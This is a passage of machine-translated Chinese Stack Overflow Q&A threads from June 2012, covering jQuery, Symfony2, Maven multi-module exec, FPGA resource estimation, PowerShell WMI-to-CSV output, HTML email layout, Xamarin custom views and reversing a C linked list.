> 时间：2012-06-18T21:26:17.460

从你的函数中删除`return false;`，它会很好用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T21:41:17.507

`return false`仅当`<a>`标签不是直接链接或浏览器仍希望返回页面顶部时才需要

`href`将具有面板的手风琴标题更改为“#”。重定向链接将与以下“IF”一起正常工作，手风琴也将正常工作

```
$('li.menu-item a').click(function() {
    if($(this).attr('href')=="#"){
        allPanels.slideUp();
        $(this).parent().find('ul').slideDown();
        return false;
    }
}); 
```

在您的服务器代码中添加一个“活动”类以链接需要打开的面板（将 href 与 url 匹配）在页面加载时

```
$('a.active').closest('ul').slideDown() 
```

# c# - 将图像上传到相册并收集用户的喜欢

> ID：11091289
> 
> 赞同：-1
> 
> 时间：2012-06-18T21:22:25.657
> 
> 标签：c#, facebook

我需要构建一个简单的 C# 应用程序，它将图像上传到 Facebook 相册并收集喜欢的数量和用户。

我正在使用 .NET Framework 3.5 和 Facebook 6.0.20

非常感谢任何帮助，如果有人也可以给我一个教程链接，但我需要一个不旧的链接，因为我注意到有些课程似乎不适用于当前版本。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T21:30:03.463

您需要使用 Facebook Graph API。您可以从[Facebook 的开发者](https://developers.facebook.com)页面下载它。

[这](https://developers.facebook.com/docs/opengraph/tutorial/)是一个教程。

# android - 更改editText标签的颜色，android

> ID：11091296
> 
> 赞同：0
> 
> 时间：2012-06-18T21:23:06.047
> 
> 标签：android, android-edittext

如何使用 java 代码更改 editText 标签的颜色？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:28:04.830

您可以使用以下方法更改背景或字体颜色。

```
setTextColor(Color.BLUE);
setBackgroundColor(Color.BLUE); 
```

# php - 如何在 symfony2 中禁用数据库配置

> ID：11091299
> 
> 赞同：10
> 
> 时间：2012-06-18T21:23:15.443
> 
> 标签：php, symfony

我正在开发的新应用程序正在使用 Symfony2。没有要使用的数据库连接。相反，它建立在许多 Web 服务调用之上。在 Symfony/app/config 下，我想删除所有 database_* 条目，但是当我这样做时，我得到一个

```
ParameterNotFoundException: You have requested a non-existent parameter "database_driver" 
```

错误很明显。但是如何从应用程序本身分离和删除数据库配置？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-06-20T08:18:58.337

从您的 AppKernel 中删除 DoctrineBundle 初始化并`doctrine`从您的`app/config/config*.yml`文件中删除配置。它在容器中注册学说配置。这就是为什么如果您尝试删除参数（捆绑已启用并查找这些参数）容器会抱怨的原因。

在最新版本的 Symfony 中，您还需要从独白配置中删除教义频道`config_dev.yml`（删除该`channels: ["doctrine"]`行）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-19T16:34:22.213

Symfony2 默认与 Doctrine2 集成。除非您设置另一个集成捆绑包，否则您无法删除配置。

如果您只是将这些字段留空，将毫不费力。仅当应用程序需要时才会建立与数据库的连接，在您的情况下，这不应该发生。

# ios - UIWebView 在我的 UITableViewCell 子类中覆盖触摸事件

> ID：11091302
> 
> 赞同：0
> 
> 时间：2012-06-18T21:23:27.157
> 
> 标签：ios, uiview, uitableview

我在 UITableViewCell 子类中存储的 UIView 子类中有一个 UIWebView。我注意到我在视图控制器中丢失了触摸事件。我怎样才能解决这个问题？

我试过了

```
- (BOOL) canResignFirstResponder {
    return YES;
} 
```

在我的自定义 UIView 中。我希望 UIWebView 在选择一个 div 时接收触摸输入。我想过让 div 100% 高，但这会导致其他问题。我正在考虑允许 UIView 子类放弃第一响应者状态，以便调用 tableView:didSelectRowAtIndexPath 但似乎不起作用。

有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-30T15:39:09.520

您是否尝试过使用手势识别器委托方法`gestureRecognizer:shouldRecognizeSimultaneouslyWithGestureRecognizer:`？你可以在这里阅读：http: [//developer.apple.com/library/ios/#documentation/uikit/reference/UIGestureRecognizerDelegate_Protocol/Reference/Reference.html](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIGestureRecognizerDelegate_Protocol/Reference/Reference.html)

# hardware - 我如何估计一个特性是否会占用 FPGA 上的太多资源？

> ID：11091303
> 
> 赞同：3
> 
> 时间：2012-06-18T21:23:27.373
> 
> 标签：hardware, vhdl, fpga

我开始我的第一个商业规模的应用程序，我经常发现自己在做一个设计，但阻止自己编码和实现它，因为这似乎是对资源的巨大使用。当它位于外围设备上时尤其如此（例如，启用移位寄存器的输出抽头）。当我想到通用实现可以得到多大（抽头示例为 4k 位）时，情况会变得更糟。最干净的实现会有这些，但在我看来，它会增加大量开销。

有没有什么规则我可以​​用来快速决定一个设计选项是否值得编码和评估？一般来说，我不太担心触发器的数量，而更多地担心信号的宽度。这可能只是来自 CS 背景，其中所有应用程序边界都应尽可能小，以防止开销。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-19T08:36:59.597

Point 1\. 我们边玩边学，所以玩！尝试几件事。看看这些工具的作用。感受一下问题所在。你不会通过这是你不尝试的东西。通常问题出在你认为它们会出现的地方。

第 2 点。您需要了解这些决定的背景。与 FPGA/您的设计的容量相比，向移位寄存器添加启用有多大？

第 3 点。有两种主要类型的“资源”需要考虑：- 细胞和时间。

从广义上讲，细胞相对容易。多少次翻牌？可识别块中有多少逻辑（例如在 ALU 中：乘法器、加法器等）？这通常由您尝试执行的设计定义。如果没有寄存器、乘法器、加法器等，就无法构建 ALU。

时间更加微妙，并且总是与细胞进行权衡。您将尝试达到一些性能目标，并认识到从第 1 点开始体验的结构会使这变得困难。

需要注意的事项包括：

*   单网带动大量事物。大扇出会导致单个驱动器负载过重，从而减慢速度。然后，该工具将不得不使用单元来缓冲该信号。经典时间与细胞之间的权衡。
*   寄存器级之间的深层逻辑块。同样，如果工具接近边缘，则该工具将不得不花费更多单元来使逻辑满足时序。简单的逻辑既快又小。有时引入流水线阶段可以减小设计的尺寸，因为它使双方的逻辑变得更加容易。

不要太担心大型总线，如果每个位都是低扇出并且您已经为寄存器进行了预算。大型总线通常是快速设计所固有的，因为您需要高带宽。宽频比提高时钟速度更容易。另一方面，考虑宽总线的控制逻辑，因为它可能有很大的扇出。

不同的工具和目标设备具有不同的特性，因此您必须玩游戏并学习设置规则。总是存在尺寸与速度（现在是“与功率”）的妥协。你需要了解是什么让你沿着这条曲线在每个方向上移动。那是有经验的。

> 有没有什么规则我可以​​用来快速决定一个设计选项是否值得编码和评估？

我能想出的唯一规则是‘我有时间吗？或不？'

如果有，我会去探索。如果不是，我最好**做点什么**。

啊，在最后期限前做设计的生活！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-19T08:34:05.120

这是经验带来的东西。这里有一些提示：

*   添加数字相当便宜
*   如果多路复用器有很多输入（每个输入的宽度也是次要问题），那么在它们之间进行选择（多路复用）会很快变大。
*   如果您的芯片中有备用乘法器，则乘法是免费的，当您用完硬 DSP 块时，它们会突然变得昂贵。
*   内存也很便宜，直到你用完为止。例如，您的 4Kbit 移位寄存器可以轻松装入单个 Xilinx 块 RAM，如果您有一个空闲块，这很好。如果不是，它将需要大量 LUT（取决于设备 - 较旧的 Spartan 3 可以将 17 位放入 LUT（包括 CLB 寄存器），因此需要约 235 个 LUT）。并不是所有的 LUT 都可以*是*移位寄存器。如果您只担心寄存器的启用，请不要。除非您正在提高设备的性能，否则将这种信号路由到几百个 LUT 不太可能导致重大时序问题。

# html - 仅将非 ASCII 字符编码为 HTML 实体，保留 HTML 标记

> ID：11091304
> 
> 赞同：2
> 
> 时间：2012-06-18T21:23:30.347
> 
> 标签：html, ruby, character-encoding, html-entities

我正在从数据库中提取文本，对其进行处理，然后将其作为纯文本上传到 HTML 电子邮件创建者。电子邮件工具是我公司内部的。它可以采用简单的 HTML 标记，但不能处理非 ASCII 字符。它们将显示`¿`给最终用户。作为我正在使用的示例，数据库中的源文本可能如下所示：

```
The café was…&lt;br/>“delicious”. 
```

我想要的输出是

```
The caf&eacute; was&hellip;<br/>&ldquo;delicious&rdquo;. 
```

如果我使用[HTMLEntities](http://htmlentities.rubyforge.org/)之类的 HTML 实体编码器，它会编码所有内容，包括标签括号 (`<`和`>`)。这是使用 HTMLEntities 的输出：

```
The caf&eacute; was&hellip;&lt;br/&gt;&ldquo;delicious&rdquo;. 
```

如果我将以上内容上传到 HTML 电子邮件工具，最终用户会在他们的电子邮件中看到：

```
The café was…&lt;br/>“delicious” 
```

有什么方法可以两全其美，标签被单独留下，但非 ASCII 字符被编码为 HTML 实体？我可以继续使用 HTMLEntities 并使用`gsub`; 像这样的东西：

```
coder = HTMLEntities.new
string = "The café was…&lt;br/>“delicious”."
coder.encode(string, :named).gsub(/&lt;/, "<").gsub(/&gt;/, ">")
#=> "The caf&eacute; was&hellip;<br/>&ldquo;delicious&rdquo;." 
```

这对我来说似乎很脆弱。有什么更好的方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T21:27:30.300

您可以尝试检查数据的编码吗？
确保您的数据库以 UTF-8 格式保存数据，并添加：

```
# encoding: UTF-8 
```

在你的 Ruby 文件的顶部。

# powershell - Powershell noob 试图显示来自多个数组的关联数据

> ID：11091305
> 
> 赞同：0
> 
> 时间：2012-06-18T21:23:34.910
> 
> 标签：powershell

虽然这可能不是很难做到，但我遇到了一些困难。我真的很少有任何语言的编程经验，所以请善待。

我的目标是创建一个简单的（工作？）函数，它将为给定主机上的每个接口捕获 IP 和子网对。这本身就是小菜一碟，效果很好。我遇到的问题是我有很多主机，上面有几十个或几百个 IP。显示它是不可行或不可用的，所以我想我会将它转储到一个 CSV 文件中，这将使我能够直接操作来自 PS 的数据以及在我想要的任何程序或编辑器中打开 CSV。

我的问题是我无法正确列出所有内容。我觉得我在获取信息并将其粉碎后的逻辑相当有缺陷或完全错误，需要一些专业的帮助。

这是似乎工作的代码的稳定部分。

```
function Get-IPConfig
{
    $op_file_location = $args[0]
    $op_file = (Import-Csv -Header ID $op_file_location)
        if (! $op_file_location) {Write-Host "Please try again in the following format: Get-IPConfig c:\full\file\path\here.csv"}       

        else {
            Foreach ($op_file.ID in $op_file)
            {
            Try {
                $SysConfig = @(gwmi -Class Win32_ComputerSystem -ComputerName $op_file.ID) 
                $NetConfig = @(gwmi -class Win32_NetworkAdapterConfiguration -ComputerName $op_file.ID -Filter "IPEnabled='TRUE'")
                }
            Catch [System.Exception] {
                    Write-Host $op_file.ID "is not responding correctly. It may be offline, or you may not have permission to access it."
                  }
                $ResultsIP = $NetConfigItem.IPAddress
                $ResultsSubnet = $NetConfigItem.IPSubnet
                $Results = $ResultsIP + $ResultsSubnet
                Foreach ($NetConfigItem in $NetConfig)
                {
                    Write-Host "Target Description:" $op_file.ID
                    Write-Host "NIC Description:" $NetConfigItem.Description
                    Foreach ($IP in $ResultsIP){Write-Host $IP}
                    Foreach ($IPSub in $ResultsSubnet) {Write-Host $IPSub}
                }
            }}
} 
```

除了我肯定很快就会听到的糟糕的编码实践和其他可怕的事情之外，我怎样才能将这些数组组合起来并准备好转储到 CSV？我觉得我的问题更多的是在这种情况下如何准备数据而不是如何写入数据。虽然我猜他们都会有相当大的影响力。需要明确的是，我已经尝试了 psObject 的东西，但没有取得多大成功。考虑到我几乎完全缺乏编程知识，我还没有找到一个不太复杂的教程。话虽如此，如果我能找到一些可以帮助我理解它的东西，我并不反对使用它。任何可能将我推向正确方向的提示或技巧将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-19T07:50:49.623

请在发布之前验证您的代码是否一切正常。

```
 Foreach ($NetConfigItem in $NetConfig)
            {
               $ResultsIP = $NetConfigItem.IPAddress
                $ResultsSubnet = $NetConfigItem.IPSubnet
                $Results = $ResultsIP + $ResultsSubnet
                Write-Host "Target Description:" $op_file.ID
                Write-Host "NIC Description:" $NetConfigItem.Description
                Foreach ($IP in $ResultsIP){Write-Host $IP}
                Foreach ($IPSub in $ResultsSubnet) {Write-Host $IPSub}
            } 
```

结果部分位于 Foreach 代码中。

最好的方法是返回一个对象，它会给你很大的灵活性，然后你可以轻松地随心所欲地操作数据。

在 foreach 中生成一个 PSCustomObject

例子

```
$OutputObject = New-Object psobject
$OutputObject | Add-Member -Name "TargetDescription" -MemberType NoteProperty -Value $op_file.ID
$OutputObject | Add-Member -Name "NICDescription:" -MemberType NoteProperty -Value $NetConfigItem.Description 
```

使用 IP 地址，我将指定最大数量的值，例如 4 个 IP 地址或您需要的任何内容，例如：

```
$OutputObject | Add-Member -Name "IPaddress1" -MemberType NoteProperty -Value $IP 
```

然后只需将 $OutPutObject 添加到提前声明的容器中，例如： $OutputContainer = @()

然后添加它

```
$OutputContainer += $OutputObject 
```

希望这对您有所帮助。

最良好的问候

# html - Gmail忽略空单元格中的高度（HTML电子邮件）

> ID：11091309
> 
> 赞同：0
> 
> 时间：2012-06-18T21:24:07.560
> 
> 标签：html, gmail, html-email

我刚刚开始使用新的 HTML 电子邮件软件（之前使用的是 Campaign Monitor，但现在不得不在我们的 CMS 中使用插件）。为了美观，我们的模板在顶部使用了一些具有不同背景颜色的空单元格。使用 Campaign Monitor 时，这些在 Gmail 中显示良好，但在新软件 (eCampaign) 中，Gmail 完全忽略了单元格的高度，使它们全部为 1 个像素高。我尝试添加 height="x" 和 style="height: x;" 但似乎都不起作用。如果可以的话，我想避免使用间隔 gif。在我放入
标签的电子邮件的下方，但这会使高度太大。我已经看到了一些将标签包装
在标签中的建议，但不确定这是否可行。有什么建议么？？需要尽快答复！

我的代码如下：

```
<table cellpadding="0" cellspacing="0" border="0" width="100%">
                <tr>
                    <td valign="top" height="6" colspan="2" bgcolor="#edede9" style="font-size:1px; line-height:6; height:6;"></td>
                </tr>
                <tr>
                    <td valign="top" height="6" colspan="2" bgcolor="#c4c3b6"><!-- --></td>
                </tr>
                <tr>
                    <td valign="top" height="1" colspan="2" bgcolor="#ffffff"><!-- --></td>
                </tr>
            </table> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-02T13:08:21.817

唯一的方法是在空单元格中使用 trans_dot.gif 或其他间隔图像。它不能以任何其他方式完成。

所以找到或制作一个1px * 1px的透明图片并插入。如果一个单元格没有文本或图像，它将在 10 个电子邮件客户端中的 9 个中崩溃

# java - Maven exec：多模块项目的java目标

> ID：11091311
> 
> 赞同：50
> 
> 时间：2012-06-18T21:24:14.907
> 
> 标签：java, maven, exec-maven-plugin

我试图在一个简单的两模块项目上运行`exec-maven-plugin`目标`exec:java`，其中一个模块依赖于另一个模块。到目前为止，我找不到有效的配置。这是一个简化的测试用例：

```
+ exec-multi-module-test/
    + pom.xml
    + module1/
        + pom.xml
        + src/
            + main/
                + java/
                    + HelloPrinter.java
    + module2/
        + pom.xml
        + src/
            + main/
                + java/
                    + MyMain.java 
```

这是父pom：

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.mkscrg.sandbox</groupId>
    <artifactId>exec-multi-module-test</artifactId>
    <version>1.0</version>
    <packaging>pom</packaging>

    <modules>
        <module>module1</module>
        <module>module2</module>
    </modules>

    <build>
        <plugins>
            <plugin>
                <groupId>org.codehaus.mojo</groupId>
                <artifactId>exec-maven-plugin</artifactId>
                <version>1.2.1</version>
            </plugin>
        </plugins>
    </build>
</project> 
```

`module1`的绒球：

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <parent>
        <artifactId>exec-multi-module-test</artifactId>
        <groupId>com.mkscrg.sandbox</groupId>
        <version>1.0</version>
    </parent>

    <artifactId>module1</artifactId>
</project> 
```

`module2`的 pom：4.0.0

```
 <parent>
        <artifactId>exec-multi-module-test</artifactId>
        <groupId>com.mkscrg.sandbox</groupId>
        <version>1.0</version>
    </parent>

    <artifactId>module2</artifactId>

    <dependencies>
        <dependency>
            <groupId>com.mkscrg.sandbox</groupId>
            <artifactId>module1</artifactId>
            <version>${project.version}</version>
        </dependency>
    </dependencies>
</project> 
```

此项目从顶部编译成功，但运行`mvn exec:java -Dexec.mainClass=myMain`失败：

```
[INFO] Scanning for projects...
[INFO] ------------------------------------------------------------------------
[INFO] Reactor Build Order:
[INFO] 
[INFO] exec-multi-module-test
[INFO] module1
[INFO] module2
[INFO]                                                                         
[INFO] ------------------------------------------------------------------------
[INFO] Building exec-multi-module-test 1.0
[INFO] ------------------------------------------------------------------------
[INFO] 
[INFO] >>> exec-maven-plugin:1.2.1:java (default-cli) @ exec-multi-module-test >>>
[INFO] 
[INFO] <<< exec-maven-plugin:1.2.1:java (default-cli) @ exec-multi-module-test <<<
[INFO] 
[INFO] --- exec-maven-plugin:1.2.1:java (default-cli) @ exec-multi-module-test ---
[WARNING] 
java.lang.ClassNotFoundException: MyMain
        at java.net.URLClassLoader$1.run(URLClassLoader.java:202)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.net.URLClassLoader.findClass(URLClassLoader.java:190)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:247)
        at org.codehaus.mojo.exec.ExecJavaMojo$1.run(ExecJavaMojo.java:285)
        at java.lang.Thread.run(Thread.java:680)
[INFO] ------------------------------------------------------------------------
[INFO] Reactor Summary:
[INFO] 
[INFO] exec-multi-module-test ............................ FAILURE [0.363s]
[INFO] module1 ........................................... SKIPPED
[INFO] module2 ........................................... SKIPPED
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 0.566s
[INFO] Finished at: Mon Jun 18 14:11:54 PDT 2012
[INFO] Final Memory: 3M/81M
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.codehaus.mojo:exec-maven-plugin:1.2.1:java (default-cli) on project exec-multi-module-test: An exception occured while executing the Java class. MyMain -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoExecutionException 
```

配置此项目以允许`exec:java`查看的正确方法是什么`MyMain`？

编辑：如果您想自己尝试一下，这是一个要点：[https ://gist.github.com/2950830](https://gist.github.com/2950830)

编辑：澄清：我知道有可能`mvn install`然后`exec:java`从`module2`'s 目录运行或使用`-pl`顶部的标志。但是，我想避免运行`mvn install`. 无需修改我的本地存储库即可在多模块项目中运行此目标。就像`mvn compile`多模块项目“正常工作”一样，其他目标/阶段也应该如此。

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2012-06-18T21:47:26.503

多模块项目中的目标，当从父级运行时，将针对所有模块运行。我不认为那是你想要的。你可以试试：

```
mvn exec:java -pl module2 -Dexec.mainClass=MyMain 
```

那可能有用吗？更多信息：

*   [在多模块反应器项目的子模块中从命令行运行特定的 Maven 插件目标](https://stackoverflow.com/questions/3459928/running-a-specific-maven-plugin-goal-from-the-command-line-in-a-sub-module-of-a/3460241#3460241)

但是，我认为在运行之前将目录更改为包含可执行文件的子模块更直观。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-06-19T04:43:05.293

*   您应该将 绑定`exec-maven-plugin`到 Maven 生命周期目标，例如`verify`.
*   由于您希望插件仅针对`module`2 执行，因此请在父 pom 中定义插件配置`pluginManagement`。仅在`module 2`.
*   然后运行以下命令：

`mvn verify -Dexec.mainClass=MyMain`.

家长会

```
<build>
    <pluginManagement>
        <plugins>
            <plugin>
                <groupId>org.codehaus.mojo</groupId>
                <artifactId>exec-maven-plugin</artifactId>
                <version>1.2.1</version>
                <executions>
                 <execution>
                     <phase>verify</phase>
                     <goals>
                         <goal>java</goal>
                     </goals>
                 </execution>
                </executions>
            </plugin>
        </plugins>
    </pluginManagement>
</build> 
```

模块 2

```
<build>
    <plugins>
        <plugin>
            <groupId>org.codehaus.mojo</groupId>
            <artifactId>exec-maven-plugin</artifactId>
        </plugin>
    </plugins>
</build> 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2017-03-20T12:48:11.427

请参阅此答案以获取不带的单命令替代方案`mvn install`：

[https://stackoverflow.com/a/26448447/1235281](https://stackoverflow.com/a/26448447/1235281)

通过`skip`在 parent 中使用`pom.xml`，您可以告诉 Maven 仅`exec:java`在特定的子模块上运行。

GitHub： [https ://github.com/Oduig/mavenfiddle](https://github.com/Oduig/mavenfiddle)

# c# - Xamarin Monodroid：WP7 => Android 和自定义控件？

> ID：11091312
> 
> 赞同：3
> 
> 时间：2012-06-18T21:24:28.677
> 
> 标签：c#, xamarin.android, custom-view, xamarin

我正在使用 Xamarin Monodroid 将我的一些 Windows Phone 应用程序移植到 Android。

我对 Xamarin 的东西很陌生，实际上只是买了一个许可证。

到目前为止，就在 AXML 中重新创建 XAML UI 而言非常好，但我正面临自定义控件的问题。

这就是我所说的自定义控件：

在 .NET 中，我通过创建从“UserControl”类继承的类创建了一堆控件，我创建了逻辑并设置了内容。然后我只是用'new my_control（）'等创建新实例......

我的一些控件不是以这种方式创建的，而是我通过定义 XAML 创建了 UserControl，其中没有特定的逻辑，但是当我需要组合 2 个或更多控件时（例如，旁边有文本的彩色正方形，所以 Rectangle + TextBlock），我只需要再次执行“new my_control()”并将其添加到 XAML UI（网格、列表框、StackPanel 等）中的某个位置。

我怎样才能用 Monodroid 实现类似的东西？

提前致谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-18T23:05:27.923

您可以通过继承 View 类来制作自己的自定义视图。这使您可以做任何事情。然后你可以在你的 AXML 中引用它：

```
<your.awesome.namespace.AwesomeViewName
  android:id="@+id/awesomeView"
  android:layout...
  /> 
```

只要确保您在 AXML 中的命名空间名称都是小写的，否则它不会选择它。

但是，如果您只需要一个非常简单的 AXML 布局并且您会经常使用，您可以创建一个新的 AXML 文件并使用 include 标签将其放入其中。

关于 Android 的一些 Layout Tricks 有一些更一般的信息，它们也适用于 Android 的 Mono：[https ://developer.android.com/resources/articles/layout-tricks-merge.html](https://developer.android.com/resources/articles/layout-tricks-merge.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-18T23:16:31.317

您也可以在 Mono for Android 中执行“自定义控件”——一旦您编写了它们，您就可以将它们包含在您的 axml 文件中。

恐怕我手头没有任何非常简单的例子，但是有一个复杂的例子：

[https://github.com/slodge/MvvmCross/blob/master/Sample%20-%20CirriousConference/Cirrious.Conference.UI.Droid/Resources/Layout/ChildPage_Twitter.axml](https://github.com/slodge/MvvmCross/blob/master/Sample%20-%20CirriousConference/Cirrious.Conference.UI.Droid/Resources/Layout/ChildPage_Twitter.axml)

如果您在 Android 中声明一个类`MyControl`并`MyNamespace`继承该控件，`View`然后您可以设置您的自定义控件 - 包括从 XML 中提取属性 - 使用如下构造函数：

```
public MyControl(Context context, IAttributeSet attrs) { /* ... */ } 
```

并使用 XML，如：

```
<mynamespace.MyControl android:layout_height='wrap_content' /> 
```

* * *

这方面的一个例子可能是来自[https://github.com/Cheesebaron/MonoDroid.Horizo​​ntalPager](https://github.com/Cheesebaron/MonoDroid.HorizontalPager)的控件- 它可以从 xml 使用 xml 之类的

```
 <mynamespace.controls.HorizontalPager
    android:id="@+id/MyPageHost"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    /> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-08-15T18:08:58.367

为什么它不会进入构造函数？这是我的构造函数：

```
protected CropImageView(IntPtr javaReference, JniHandleOwnership transfer)
        : base(javaReference, transfer)
    {

    } 
```

当我膨胀crop_image_view xml时，Init方法会导致循环依赖

我尝试过公共，私人但没有运气......这是我的代码：[https ://github.com/slown1/Xamarin.CircleImageCropper](https://github.com/slown1/Xamarin.CircleImageCropper)

# html - 将 HTML 表格中的 CSS 格式化为每个单元格一行

> ID：11091316
> 
> 赞同：0
> 
> 时间：2012-06-18T21:24:50.087
> 
> 标签：html, css, google-visualization

我正在开发一个网页到服务器作为我们工作中的快速参考工具，并且我正在使用 Google 的 Visualization API [Google Visualization](https://developers.google.com/chart/interactive/docs/reference#arrowformatter)来帮助加快速度。但是，我有一个名为“数据库”的列，其中包含我们公司使用的一堆数据库：

```
tc2007 tc200711 tc200712 tc200713 tc200714 tc200715 tc200716 tc200717 tc801 tc2008 tc200718 tc20072 tc810 tc200721 tc820 tc83i tc811 tc830 tc90 tc10ms1/tc10ms2 tc91 
```

当我进行搜索时，我想让上面的每个值每行显示一个元素，不管有多少，或者表格单元格有多大。有人知道如何修改其他可行的CSS吗？现在这些值在表中被放在一边，所以格式看起来不太好。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-06-18T21:29:30.120

你不能只设置列的宽度吗？

```
 <td width="50px">....</td> 
```

在 CSS 中

```
 .table td
            {
             width: 50px
             } 
```

# java - 在 Android 服务上运行的 Lighttpd

> ID：11091318
> 
> 赞同：0
> 
> 时间：2012-06-18T21:24:57.170
> 
> 标签：java, android, web-services, lighttpd

我正在开发一个运行托管 Android 设备的 Web 服务的应用程序。我现在正在使用一个基本的网络服务器，并被要求能够支持诸如 FastCGI 之类的技术。我发现 Lighttpd 似乎可以满足，但我不知道从哪里开始将它集成到 Android。有没有人对在哪里寻找这种用途的例子有任何建议。只要它支持 FastCGI，我就对任何网络服务器开放。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T14:28:45.833

这是关于成功构建的博客文章：http: [//hex.ro/wp/blog/php-and-lighttpd-for-android/](http://hex.ro/wp/blog/php-and-lighttpd-for-android/)

它可能会帮助您开始。

# c - 分配节点（反向链表）

> ID：11091322
> 
> 赞同：4
> 
> 时间：2012-06-18T21:25:11.310
> 
> 标签：c, pointers, linked-list, nodes

我想编写一种迭代和递归的方式来反转链表。

不幸的是，在这两种情况下，我都遇到了类似的问题：我无法将一个节点的指针更改为另一个节点，并且在某些情况下，我在迭代列表时遇到了困难。例如，这是我的递归反向函数：

```
node *reverse(node *initial){
    node *prev = initial;
    node *nextNode;
    nextNode = (node *)malloc(sizeof(struct node));
    nextNode = initial->next;
    if(nextNode->next == NULL){
        return  prev;
    }
    else{
        nextNode = reverse(nextNode);
        nextNode->next = prev;
    }
} 
```

该`nextNode = initial->next;`行使程序崩溃。我确信这段代码还有很多其他问题，如果它存在致命缺陷，我愿意接受建议，但我主要只是想解决这个错误，以便我可以自己调试其余部分。在迭代版本中，导致程序崩溃的一些类似行是：

```
startA = startA->next; // startA is a node pointer
backNode = startB; // backNode and startB are both node pointers
backNode->data = frontNode->data; //both ints
frontNode->data = temp; //again both ints 
```

根据要求，其余代码：

```
main(){
node *  start = buildList();
int i;
int nodeSize = sizeof(struct node);
reverse(start);
} 
```

和构建列表：

```
node *buildList(){
node *head = NULL;
node *second = NULL;
node *third = NULL;
node *fourth = NULL;
node *fifth = NULL;

head = (node *)malloc(sizeof(struct node));
second = (node *)malloc(sizeof(struct node));
third = (node *)malloc(sizeof(struct node));
fourth = (node *)malloc(sizeof(struct node));
fifth = (node *)malloc(sizeof(struct node));

head->data = 1;
head->next = second;

second->data  =2;
second->next = third;

third->data = 3;
third->next = fourth;

fourth->data =4;
fourth->next = fifth;

fifth->data = 5;
fifth->next = NULL;

return head;    
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T21:35:55.333

请注意，当您`nextNode->next`在`if`语句中取消引用时，您没有检查`nextNode == NULL`.

基本上你在做：

```
if (initial->next->next == NULL) 
```

如果在这里会发生什么`initial->next == NULL`？这也是您的递归*base-case*的问题。

此外，您`malloc`被浪费了并且会导致内存泄漏：您分配给一个新的内存块，然后当您在下一行`nextNode`分配其他内容时丢失对该块的引用： A在这里是不必要的：您没有添加新的节点到您的列表，仅重新排列您拥有的节点。`nextNode``nextNode = initial->next;``malloc`

实现递归时，请仔细考虑您的*基本情况*。使用您的代码，您希望递归遍历您的列表到其最后一个节点，然后用于`return`再次向后构建列表。你怎么知道你什么时候在列表的最后一个节点上？这是你的*基本情况*，你的递归函数应该从那里开始。您可以仅使用您的函数参数来确定这一点吗？

这与您当前的代码没有太大不同，但您发布的代码包含许多错误。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-19T00:58:10.503

这是为您提供的快速演练：

```
node *reverse(node *initial){

    if (initial is NULL)
        /* this is an empty list so return */
        return a null pointer;

    if (initial->next is NULL)
        /* this is the recursion base case under normal operation - one elem left */
        return initial;

    node *prev = initial;
    node *nextNode = initial->next;

    /* reverse the rest of the list starting at the next node */
    nextNode = reverse(nextNode);

    /* now just reverse the pointers */
    initial->next->next = prev;
    /*
     * but remember that prev->next still points to the wrong node,
     * we need to clear that 
     */
    prev->next = NULL;

    /* you were also missing the return case here */
    /* we want to keep track of the last element (the new head element) */
    /* keep passing this back up through the recursive steps */
    return nextNode;

} 
```

# asp.net - 从调用服务器端 C#中继器中的元素

> ID：11091323
> 
> 赞同：0
> 
> 时间：2012-06-18T21:25:19.590
> 
> 标签：asp.net, repeater

```
<td><input type="image" style="border-width:0" alt="Do an Edit" title="Edit the repeater row" tabindex="0" src='<%=ResolveUrl("~/css/image.png") %>' onclick='showModal(<%#Container.ItemIndex %>); return false;'/></td> 
```

我已经在使用`onClick()`调用 javascript 方法了。现在，我想向该元素添加另一个事件以触发服务器端事件 - 比如说使用`onKeyUp`- 并将转发器上的 1 个参数传递给服务器端。

